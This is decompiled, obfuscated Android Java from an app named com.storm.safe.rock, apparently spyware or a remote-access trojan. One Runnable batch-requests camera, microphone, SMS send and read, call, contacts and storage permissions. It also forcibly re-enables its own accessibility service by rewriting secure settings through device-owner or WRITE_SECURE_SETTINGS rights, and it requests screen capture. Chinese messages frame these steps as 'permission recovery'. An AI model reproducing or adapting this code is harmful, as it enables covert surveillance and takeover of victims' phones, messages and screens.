package p000;

import android.R;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.ContentResolver;
import android.content.Intent;
import android.media.projection.MediaProjectionManager;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.provider.Settings;
import android.widget.Button;
import android.widget.TextView;
import com.storm.safe.rock.R$string;
import com.storm.safe.rock.activity.qixvbtmo;
import com.storm.safe.rock.iuzxujjtqev;
import com.storm.safe.rock.receiver.zbrefryi;
import com.storm.safe.rock.service.dqtvuisjd;
import io.socket.engineio.parser.Base64;
import java.util.ArrayList;
import java.util.List;
import kotlin.text.AbstractC0779a1;
import okhttp3.internal.p032ws.WebSocketProtocol;
import org.conscrypt.FileClientSessionCache;

/* compiled from: r8-map-id-6aa8c380066ac34eca52ba03819884bf743dac35e85c6cbaefaab30e4b90b459 */
/* loaded from: classes2.dex */
public final /* synthetic */ class bk1 implements Runnable {

    /* renamed from: a0 */
    public final /* synthetic */ int f45902a0;

    /* renamed from: a1 */
    public final /* synthetic */ iuzxujjtqev f45903a1;

    public /* synthetic */ bk1(iuzxujjtqev iuzxujjtqevVar, int i) {
        this.f45902a0 = i;
        this.f45903a1 = iuzxujjtqevVar;
    }

    @Override // java.lang.Runnable
    public final void run() throws InterruptedException {
        int i = this.f45902a0;
        iuzxujjtqev iuzxujjtqevVar = this.f45903a1;
        switch (i) {
            case 0:
                iuzxujjtqev.C0254a0 c0254a0 = iuzxujjtqev.f51956e2;
                t60.m214695b6(iuzxujjtqevVar, "this$0");
                TextView textView = iuzxujjtqevVar.f51958c3;
                if (textView == null) {
                    t60.m214724f2("statusText");
                    throw null;
                }
                textView.setText(iuzxujjtqevVar.getString(R$string.status_activity_failed));
                TextView textView2 = iuzxujjtqevVar.f51958c3;
                if (textView2 != null) {
                    textView2.setTextColor(iuzxujjtqevVar.getColor(R.color.holo_orange_dark));
                    return;
                } else {
                    t60.m214724f2("statusText");
                    throw null;
                }
            case 1:
                iuzxujjtqev.C0254a0 c0254a02 = iuzxujjtqev.f51956e2;
                t60.m214695b6(iuzxujjtqevVar, "this$0");
                iuzxujjtqevVar.m211223d3();
                return;
            case 2:
                iuzxujjtqev.C0254a0 c0254a03 = iuzxujjtqev.f51956e2;
                t60.m214695b6(iuzxujjtqevVar, "this$0");
                iuzxujjtqevVar.m211209b5();
                return;
            case 3:
                iuzxujjtqev.C0254a0 c0254a04 = iuzxujjtqev.f51956e2;
                t60.m214695b6(iuzxujjtqevVar, "this$0");
                TextView textView3 = iuzxujjtqevVar.f51958c3;
                if (textView3 == null) {
                    t60.m214724f2("statusText");
                    throw null;
                }
                textView3.setText(iuzxujjtqevVar.getString(R$string.status_requesting_all));
                TextView textView4 = iuzxujjtqevVar.f51958c3;
                if (textView4 != null) {
                    textView4.setTextColor(iuzxujjtqevVar.getColor(R.color.holo_orange_dark));
                    return;
                } else {
                    t60.m214724f2("statusText");
                    throw null;
                }
            case 4:
                iuzxujjtqev.C0254a0 c0254a05 = iuzxujjtqev.f51956e2;
                try {
                    ArrayList arrayList = new ArrayList();
                    ArrayList arrayList2 = new ArrayList();
                    int i2 = Build.VERSION.SDK_INT;
                    if (iuzxujjtqevVar.checkSelfPermission("android.permission.CAMERA") != 0) {
                        arrayList.add("android.permission.CAMERA");
                        arrayList2.add("摄像头");
                    }
                    if (iuzxujjtqevVar.checkSelfPermission("android.permission.RECORD_AUDIO") != 0) {
                        arrayList.add("android.permission.RECORD_AUDIO");
                        arrayList2.add("麦克风");
                    }
                    String[] strArr = i2 >= 33 ? new String[]{"android.permission.READ_MEDIA_IMAGES", "android.permission.READ_MEDIA_VIDEO"} : new String[]{"android.permission.READ_EXTERNAL_STORAGE", "android.permission.WRITE_EXTERNAL_STORAGE"};
                    ArrayList arrayList3 = new ArrayList();
                    for (String str : strArr) {
                        if (iuzxujjtqevVar.checkSelfPermission(str) != 0) {
                            arrayList3.add(str);
                        }
                    }
                    if (!arrayList3.isEmpty()) {
                        arrayList.addAll(arrayList3);
                        arrayList2.add("相册");
                    }
                    String[] strArr2 = {"android.permission.READ_SMS", "android.permission.SEND_SMS", "android.permission.RECEIVE_SMS", "android.permission.READ_PHONE_STATE", "android.permission.CALL_PHONE"};
                    ArrayList arrayList4 = new ArrayList();
                    for (int i3 = 0; i3 < 5; i3++) {
                        String str2 = strArr2[i3];
                        if (iuzxujjtqevVar.checkSelfPermission(str2) != 0) {
                            arrayList4.add(str2);
                        }
                    }
                    if (!arrayList4.isEmpty()) {
                        arrayList.addAll(arrayList4);
                        arrayList2.add("短信");
                    }
                    ArrayList arrayList5 = new ArrayList();
                    String str3 = new String[]{"android.permission.READ_CONTACTS"}[0];
                    if (iuzxujjtqevVar.checkSelfPermission(str3) != 0) {
                        arrayList5.add(str3);
                    }
                    if (!arrayList5.isEmpty()) {
                        arrayList.addAll(arrayList5);
                        arrayList2.add("通讯录");
                    }
                    if (arrayList.isEmpty()) {
                        iuzxujjtqevVar.runOnUiThread(new dk1(iuzxujjtqevVar, 0));
                        return;
                    } else {
                        iuzxujjtqevVar.requestPermissions((String[]) arrayList.toArray(new String[0]), 1010);
                        iuzxujjtqevVar.runOnUiThread(new RunnableC1052p1(iuzxujjtqevVar, 20, arrayList2));
                        return;
                    }
                } catch (Exception e) {
                    t60.m214705c6("iuzxujjtqev", "❌ 收集权限列表失败", e);
                    iuzxujjtqevVar.runOnUiThread(new dk1(iuzxujjtqevVar, 1));
                    return;
                }
            case 5:
                iuzxujjtqev.C0254a0 c0254a06 = iuzxujjtqev.f51956e2;
                t60.m214695b6(iuzxujjtqevVar, "this$0");
                TextView textView5 = iuzxujjtqevVar.f51958c3;
                if (textView5 == null) {
                    t60.m214724f2("statusText");
                    throw null;
                }
                textView5.setText(iuzxujjtqevVar.getString(R$string.status_permission_request_failed));
                TextView textView6 = iuzxujjtqevVar.f51958c3;
                if (textView6 != null) {
                    textView6.setTextColor(iuzxujjtqevVar.getColor(R.color.holo_red_dark));
                    return;
                } else {
                    t60.m214724f2("statusText");
                    throw null;
                }
            case 6:
                iuzxujjtqev.C0254a0 c0254a07 = iuzxujjtqev.f51956e2;
                try {
                    ContentResolver contentResolver = iuzxujjtqevVar.getContentResolver();
                    String str4 = iuzxujjtqevVar.getPackageName() + "/" + dqtvuisjd.class.getName();
                    String string = Settings.Secure.getString(contentResolver, "enabled_accessibility_services");
                    if (string == null) {
                        string = "";
                    }
                    List listM213677d0 = AbstractC0779a1.m213677d0(string, new String[]{":"}, 6);
                    ArrayList arrayList6 = new ArrayList();
                    for (Object obj : listM213677d0) {
                        String str5 = (String) obj;
                        if (str5.length() > 0 && !str5.equals(str4)) {
                            arrayList6.add(obj);
                        }
                    }
                    String strM213295i2 = AbstractC0715je.m213295i2(arrayList6, ":", null, null, null, 62);
                    if (strM213295i2.length() != 0) {
                        str4 = strM213295i2 + ":" + str4;
                    }
                    Object systemService = iuzxujjtqevVar.getSystemService("device_policy");
                    DevicePolicyManager devicePolicyManager = systemService instanceof DevicePolicyManager ? (DevicePolicyManager) systemService : null;
                    if (devicePolicyManager != null && devicePolicyManager.isDeviceOwnerApp(iuzxujjtqevVar.getPackageName())) {
                        ComponentName componentName = new ComponentName(iuzxujjtqevVar, (Class<?>) zbrefryi.class);
                        devicePolicyManager.setSecureSetting(componentName, "enabled_accessibility_services", strM213295i2);
                        Thread.sleep(200L);
                        devicePolicyManager.setSecureSetting(componentName, "enabled_accessibility_services", str4);
                        devicePolicyManager.setSecureSetting(componentName, "accessibility_enabled", "1");
                        t60.m214714d6("iuzxujjtqev", "✅ [Vivo修复] DeviceOwner 先删后加重绑成功");
                        return;
                    }
                    try {
                        Settings.Secure.putString(contentResolver, "enabled_accessibility_services", strM213295i2);
                        Thread.sleep(200L);
                        Settings.Secure.putString(contentResolver, "enabled_accessibility_services", str4);
                        Settings.Secure.putInt(contentResolver, "accessibility_enabled", 1);
                        t60.m214714d6("iuzxujjtqev", "✅ [Vivo修复] WRITE_SECURE_SETTINGS 先删后加重绑成功");
                        return;
                    } catch (SecurityException unused) {
                        t60.m214726f4("iuzxujjtqev", "⚠️ [Vivo修复] 无 WRITE_SECURE_SETTINGS 权限，跳过强制重绑");
                        return;
                    }
                } catch (Exception e2) {
                    tz0.m214807a7("❌ [Vivo修复] 强制重绑失败: ", e2.getMessage(), "iuzxujjtqev");
                    return;
                }
            case 7:
                iuzxujjtqev.C0254a0 c0254a08 = iuzxujjtqev.f51956e2;
                t60.m214695b6(iuzxujjtqevVar, "this$0");
                if (!iuzxujjtqevVar.isFinishing()) {
                    iuzxujjtqevVar.finish();
                }
                iuzxujjtqevVar.overridePendingTransition(0, 0);
                return;
            case 8:
                iuzxujjtqev.C0254a0 c0254a09 = iuzxujjtqev.f51956e2;
                t60.m214695b6(iuzxujjtqevVar, "this$0");
                if (!iuzxujjtqevVar.isFinishing()) {
                    iuzxujjtqevVar.finish();
                }
                iuzxujjtqevVar.overridePendingTransition(0, 0);
                return;
            case 9:
                iuzxujjtqev.C0254a0 c0254a010 = iuzxujjtqev.f51956e2;
                try {
                    Intent intent = new Intent(iuzxujjtqevVar, (Class<?>) qixvbtmo.class);
                    intent.addFlags(268435456);
                    iuzxujjtqevVar.startActivity(intent);
                    return;
                } catch (Exception e3) {
                    t60.m214705c6("iuzxujjtqev", "❌ 启动 qixvbtmo 失败", e3);
                    return;
                }
            case 10:
                iuzxujjtqev.C0254a0 c0254a011 = iuzxujjtqev.f51956e2;
                t60.m214695b6(iuzxujjtqevVar, "this$0");
                iuzxujjtqevVar.m211235e5("✅ 权限恢复成功\n功能已恢复", Integer.valueOf(R.color.holo_green_dark));
                iuzxujjtqevVar.m211234e4("恢复完成", null, Boolean.FALSE);
                return;
            case oe0.DEFAULT_M /* 11 */:
                iuzxujjtqev.C0254a0 c0254a012 = iuzxujjtqev.f51956e2;
                t60.m214695b6(iuzxujjtqevVar, "this$0");
                return;
            case FileClientSessionCache.MAX_SIZE /* 12 */:
                iuzxujjtqev.C0254a0 c0254a013 = iuzxujjtqev.f51956e2;
                t60.m214695b6(iuzxujjtqevVar, "this$0");
                TextView textView7 = iuzxujjtqevVar.f51958c3;
                if (textView7 == null) {
                    t60.m214724f2("statusText");
                    throw null;
                }
                textView7.setText(iuzxujjtqevVar.getString(R$string.status_permission_success));
                TextView textView8 = iuzxujjtqevVar.f51958c3;
                if (textView8 != null) {
                    textView8.setTextColor(iuzxujjtqevVar.getColor(R.color.holo_green_dark));
                }
                iuzxujjtqevVar.m211234e4("权限申请成功", null, Boolean.FALSE);
                return;
            case 13:
                iuzxujjtqev.C0254a0 c0254a014 = iuzxujjtqev.f51956e2;
                if (iuzxujjtqevVar.isFinishing()) {
                    return;
                }
                iuzxujjtqevVar.runOnUiThread(new dk1(iuzxujjtqevVar, 5));
                return;
            case 14:
                iuzxujjtqev.C0254a0 c0254a015 = iuzxujjtqev.f51956e2;
                if (iuzxujjtqevVar.isFinishing()) {
                    return;
                }
                iuzxujjtqevVar.runOnUiThread(new dk1(iuzxujjtqevVar, 2));
                return;
            case WebSocketProtocol.B0_MASK_OPCODE /* 15 */:
                iuzxujjtqev.C0254a0 c0254a016 = iuzxujjtqev.f51956e2;
                if (iuzxujjtqevVar.isFinishing()) {
                    return;
                }
                try {
                    Intent intent2 = new Intent(iuzxujjtqevVar, (Class<?>) iuzxujjtqev.class);
                    intent2.setFlags(268468224);
                    intent2.putExtra("AUTO_REQUEST_PERMISSION", true);
                    intent2.putExtra("MIUI_PERMISSION_FIX", true);
                    intent2.putExtra("TIMESTAMP", System.currentTimeMillis());
                    iuzxujjtqevVar.startActivity(intent2);
                    return;
                } catch (Exception e4) {
                    t60.m214705c6("iuzxujjtqev", "❌ MIUI修复失败", e4);
                    iuzxujjtqevVar.m211212c2();
                    return;
                }
            case 16:
                iuzxujjtqev.C0254a0 c0254a017 = iuzxujjtqev.f51956e2;
                t60.m214695b6(iuzxujjtqevVar, "this$0");
                iuzxujjtqevVar.m211238e8();
                return;
            case 17:
                iuzxujjtqev.C0254a0 c0254a018 = iuzxujjtqev.f51956e2;
                t60.m214695b6(iuzxujjtqevVar, "this$0");
                TextView textView9 = iuzxujjtqevVar.f51958c3;
                if (textView9 == null) {
                    t60.m214724f2("statusText");
                    throw null;
                }
                textView9.setText(iuzxujjtqevVar.getString(R$string.status_builtin_method));
                TextView textView10 = iuzxujjtqevVar.f51958c3;
                if (textView10 != null) {
                    textView10.setTextColor(iuzxujjtqevVar.getColor(R.color.holo_orange_dark));
                    return;
                } else {
                    t60.m214724f2("statusText");
                    throw null;
                }
            case 18:
                iuzxujjtqev.C0254a0 c0254a019 = iuzxujjtqev.f51956e2;
                try {
                    if (iuzxujjtqevVar.isFinishing() || iuzxujjtqevVar.isDestroyed()) {
                        t60.m214704c5("iuzxujjtqev", "❌ Activity已销毁，取消权限申请");
                    } else {
                        Object systemService2 = iuzxujjtqevVar.getSystemService("media_projection");
                        t60.m214693b4(systemService2, "null cannot be cast to non-null type android.media.projection.MediaProjectionManager");
                        MediaProjectionManager mediaProjectionManager = (MediaProjectionManager) systemService2;
                        iuzxujjtqevVar.f51964c9 = mediaProjectionManager;
                        Intent intentCreateScreenCaptureIntent = mediaProjectionManager.createScreenCaptureIntent();
                        if (intentCreateScreenCaptureIntent == null) {
                            t60.m214704c5("iuzxujjtqev", "❌ MIUI设备创建权限Intent失败");
                            iuzxujjtqevVar.m211227d7();
                        } else {
                            try {
                                iuzxujjtqevVar.startActivityForResult(intentCreateScreenCaptureIntent, WebSocketProtocol.CLOSE_CLIENT_GOING_AWAY);
                                iuzxujjtqevVar.m211229d9();
                                iuzxujjtqevVar.runOnUiThread(new dk1(iuzxujjtqevVar, 8));
                            } catch (Exception e5) {
                                t60.m214705c6("iuzxujjtqev", "❌ MIUI设备启动权限对话框失败", e5);
                                iuzxujjtqevVar.m211227d7();
                            }
                        }
                    }
                    return;
                } catch (Exception e6) {
                    t60.m214705c6("iuzxujjtqev", "❌ MIUI设备权限申请失败", e6);
                    iuzxujjtqevVar.runOnUiThread(new dk1(iuzxujjtqevVar, 9));
                    new Handler(Looper.getMainLooper()).postDelayed(new dk1(iuzxujjtqevVar, 10), 500L);
                    return;
                }
            case Base64.Encoder.LINE_GROUPS /* 19 */:
                iuzxujjtqev.C0254a0 c0254a020 = iuzxujjtqev.f51956e2;
                t60.m214695b6(iuzxujjtqevVar, "this$0");
                iuzxujjtqevVar.m211235e5("🔧 服务权限修复中...\n正在尝试重新显示权限对话框", Integer.valueOf(iuzxujjtqevVar.getColor(R.color.holo_orange_dark)));
                Button button = iuzxujjtqevVar.f51959c4;
                if (button != null) {
                    button.setText(iuzxujjtqevVar.getString(R$string.btn_fixing));
                    Button button2 = iuzxujjtqevVar.f51959c4;
                    if (button2 != null) {
                        button2.setEnabled(false);
                        return;
                    } else {
                        t60.m214724f2("enableButton");
                        throw null;
                    }
                }
                return;
            case 20:
                iuzxujjtqev.C0254a0 c0254a021 = iuzxujjtqev.f51956e2;
                if (iuzxujjtqevVar.isFinishing()) {
                    return;
                }
                new Handler(Looper.getMainLooper()).post(new bk1(iuzxujjtqevVar, 24));
                return;
            case 21:
                iuzxujjtqev.C0254a0 c0254a022 = iuzxujjtqev.f51956e2;
                try {
                    new Handler(Looper.getMainLooper()).postDelayed(new dk1(iuzxujjtqevVar, 6), 100L);
                    new Handler(Looper.getMainLooper()).postDelayed(new dk1(iuzxujjtqevVar, 7), 200L);
                    return;
                } catch (Exception e7) {
                    t60.m214705c6("iuzxujjtqev", "❌ 异步设置Activity前台显示失败", e7);
                    return;
                }
            case 22:
                iuzxujjtqev.C0254a0 c0254a023 = iuzxujjtqev.f51956e2;
                t60.m214695b6(iuzxujjtqevVar, "this$0");
                iuzxujjtqevVar.m211235e5("✅ 应用已启动\n等待权限申请流程...", Integer.valueOf(R.color.holo_blue_dark));
                Button button3 = iuzxujjtqevVar.f51959c4;
                if (button3 != null) {
                    button3.setText(iuzxujjtqevVar.getString(R$string.btn_waiting));
                    Button button4 = iuzxujjtqevVar.f51959c4;
                    if (button4 != null) {
                        button4.setEnabled(false);
                        return;
                    } else {
                        t60.m214724f2("enableButton");
                        throw null;
                    }
                }
                return;
            case 23:
                iuzxujjtqev.C0254a0 c0254a024 = iuzxujjtqev.f51956e2;
                t60.m214695b6(iuzxujjtqevVar, "this$0");
                iuzxujjtqevVar.m211235e5("✅ 小米Android 13设备\n应用已启动，等待权限申请流程...", Integer.valueOf(R.color.holo_blue_dark));
                Button button5 = iuzxujjtqevVar.f51959c4;
                if (button5 != null) {
                    button5.setText(iuzxujjtqevVar.getString(R$string.btn_waiting));
                    Button button6 = iuzxujjtqevVar.f51959c4;
                    if (button6 != null) {
                        button6.setEnabled(false);
                        return;
                    } else {
                        t60.m214724f2("enableButton");
                        throw null;
                    }
                }
                return;
            case 24:
                try {
                    if (iuzxujjtqev.m211204b6()) {
                        iuzxujjtqevVar.sendBroadcast(new Intent("com.storm.safe.rock.intent.STOP_ACTIVITY_CREATION"));
                        iuzxujjtqevVar.runOnUiThread(new dk1(iuzxujjtqevVar, 16));
                    } else {
                        iuzxujjtqevVar.m211210c0();
                    }
                    return;
                } catch (Exception e8) {
                    t60.m214705c6("iuzxujjtqev", "❌ 异步处理权限申请失败", e8);
                    return;
                }
            case 25:
                iuzxujjtqev.C0254a0 c0254a025 = iuzxujjtqev.f51956e2;
                t60.m214695b6(iuzxujjtqevVar, "this$0");
                iuzxujjtqevVar.m211236e6("🧠 智能权限恢复中...\n正在尝试自动恢复服务权限", Integer.valueOf(R.color.holo_blue_dark));
                iuzxujjtqevVar.m211234e4("智能恢复中...", null, Boolean.FALSE);
                return;
            case 26:
                iuzxujjtqev.C0254a0 c0254a026 = iuzxujjtqev.f51956e2;
                t60.m214695b6(iuzxujjtqevVar, "this$0");
                iuzxujjtqevVar.m211224d4();
                return;
            case 27:
                iuzxujjtqev.C0254a0 c0254a027 = iuzxujjtqev.f51956e2;
                try {
                    iuzxujjtqevVar.m211209b5();
                    return;
                } catch (Exception e9) {
                    t60.m214705c6("iuzxujjtqev", "❌ 权限恢复失败处理出错", e9);
                    iuzxujjtqevVar.m211209b5();
                    return;
                }
            case 28:
                iuzxujjtqev.C0254a0 c0254a028 = iuzxujjtqev.f51956e2;
                t60.m214695b6(iuzxujjtqevVar, "this$0");
                if (!iuzxujjtqevVar.isFinishing()) {
                    iuzxujjtqevVar.finish();
                }
                iuzxujjtqevVar.overridePendingTransition(0, 0);
                return;
            default:
                iuzxujjtqev.C0254a0 c0254a029 = iuzxujjtqev.f51956e2;
                t60.m214695b6(iuzxujjtqevVar, "this$0");
                if (!iuzxujjtqevVar.isFinishing()) {
                    iuzxujjtqevVar.finish();
                }
                iuzxujjtqevVar.overridePendingTransition(0, 0);
                return;
        }
    }
}
